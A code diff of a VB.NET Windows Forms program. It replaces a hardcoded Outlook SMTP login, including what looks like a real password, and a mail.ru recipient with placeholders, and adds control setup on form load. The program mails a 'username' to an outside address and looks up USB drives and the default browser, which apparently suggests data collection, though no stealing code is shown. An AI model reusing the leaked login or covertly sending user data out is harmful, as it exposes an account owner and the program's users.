@@ -211,14 +211,14 @@ Public Class Form1
             Dim Smtp_Server As New SmtpClient
             Dim mail As New MailMessage()
             Smtp_Server.UseDefaultCredentials = False
-            Smtp_Server.Credentials = New Net.NetworkCredential("coa.brat@outlook.com", "NekiNoviPassword")
+            Smtp_Server.Credentials = New Net.NetworkCredential("sender@email.com", "password")
             Smtp_Server.Port = 587
             Smtp_Server.EnableSsl = True
             Smtp_Server.Host = "smtp-mail.outlook.com"
 
             mail = New MailMessage()
-            mail.From = New MailAddress("coa.brat@outlook.com")
-            mail.To.Add("aleksandar.todorovic@mail.ru")
+            mail.From = New MailAddress("sender@email.com")
+            mail.To.Add("reciever@email.com")
             mail.Subject = username
             mail.IsBodyHtml = False
             mail.Body = "test"
@@ -232,6 +232,13 @@ Public Class Form1
     End Function
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        RadioButton1.Enabled = True
+        RadioButton1.Checked = True
+        RadioButton2.Enabled = False
+        RadioButton3.Enabled = False
+        GroupBox2.Enabled = False
+
         getUSBLetter()
         defaultBrowser = getDefaultBrowser()
     End Sub
